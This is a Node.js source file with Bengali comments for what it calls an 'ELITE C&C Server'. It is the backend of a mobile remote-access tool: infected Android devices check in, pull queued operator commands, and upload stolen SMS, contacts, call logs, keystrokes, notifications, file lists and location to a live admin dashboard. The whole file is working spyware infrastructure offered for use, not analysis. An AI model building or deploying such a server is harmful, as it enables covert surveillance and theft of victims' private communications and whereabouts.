const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*" },
    maxHttpBufferSize: 1e8 // ১০০ মেগাবাইট পর্যন্ত ফাইল/ফ্রেম সাপোর্ট করবে
});

const PORT = process.env.PORT || 3000;

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json({ limit: '100mb' }));

let devices = {}; 

// --- APK Connectivity API ---

// ১. হার্টবিট এবং কমান্ড আদান-প্রদান
app.post('/api/ping', (req, res) => {
    const { deviceId, status } = req.body;
    if (deviceId) {
        if (!devices[deviceId]) devices[deviceId] = { commands: [], lastSeen: '' };
        devices[deviceId].info = status; // Model, Battery, OS, RAM, Storage
        devices[deviceId].lastSeen = new Date().toLocaleTimeString();
        
        // ড্যাশবোর্ড আপডেট করা
        io.emit('update_list', { deviceId, ...devices[deviceId] });
        
        // পেন্ডিং কমান্ডগুলো অ্যাপে পাঠানো
        const cmdToSend = devices[deviceId].commands.splice(0);
        res.json({ commands: cmdToSend });
    } else res.status(400).send();
});

// ২. সব ধরণের ডাটা (Deep Data) রিসিভ করা
app.post('/api/upload', (req, res) => {
    const { deviceId, type, data } = req.body;
    
    // ডাটা টাইপ অনুযায়ী ড্যাশবোর্ডে পাঠানো
    // Types: SMS, CONTACTS, CALL_LOGS, KEYLOG, NOTIFICATION, FILE_LIST, LOCATION
    io.emit('new_incoming_data', { deviceId, type, data });
    
    console.log(`[DATA] ${type} received from ${deviceId}`);
    res.json({ status: 'success' });
});

// --- Dashboard Real-time Controls ---
io.on('connection', (socket) => {
    console.log('Admin Connected to Dashboard');

    socket.on('send_cmd', ({ id, cmd, payload }) => {
        if (devices[id]) {
            devices[id].commands.push({ action: cmd, ...payload });
            console.log(`[CMD] ${cmd} queued for ${id}`);
        }
    });
});

server.listen(PORT, () => console.log(`ELITE C&C Server Active on Port ${PORT}`));
